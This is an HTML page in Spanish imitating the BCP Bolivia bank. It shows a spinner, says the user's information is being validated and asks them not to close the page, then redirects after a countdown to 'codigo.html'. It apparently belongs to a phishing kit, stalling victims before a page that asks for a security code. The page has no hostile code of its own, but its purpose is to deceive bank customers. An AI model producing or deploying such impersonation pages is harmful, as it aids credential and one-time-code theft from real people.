<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BCP Bolivia · Validando</title>

  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">

  <style>
    :root {
      --bcp-blue: #0033a0;
      --bcp-orange: #ff6600;
      --white: #fff;
      --radius: 10px;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Nunito Sans', sans-serif;
      color: var(--white);
      background: var(--bcp-blue);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
      padding: 30px;
    }

    .logo {
      width: 160px;
      margin-bottom: 30px;
    }

    .loader {
      border: 6px solid rgba(255, 255, 255, 0.2);
      border-top: 6px solid var(--bcp-orange);
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .message {
      font-size: 18px;
      font-weight: 600;
      opacity: 0.9;
      margin-bottom: 10px;
    }

    .countdown {
      font-size: 16px;
      font-weight: 700;
      color: var(--bcp-orange);
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <img src="icon_bcp_login.svg" alt="BCP Bolivia" class="logo">
  <div class="loader"></div>
  <div class="message">
    Estamos validando tu información.<br>
    Por favor no cierres esta página.
  </div>
  <div class="countdown">Redirigiendo en <span id="timer">30</span> segundos…</div>

  <script>
    let seconds = 30;
    const timerEl = document.getElementById('timer');

    const countdown = setInterval(() => {
      seconds--;
      timerEl.textContent = seconds;
      if (seconds <= 0) {
        clearInterval(countdown);
        window.location.href = "codigo.html";
      }
    }, 1000);
  </script>
</body>
</html>
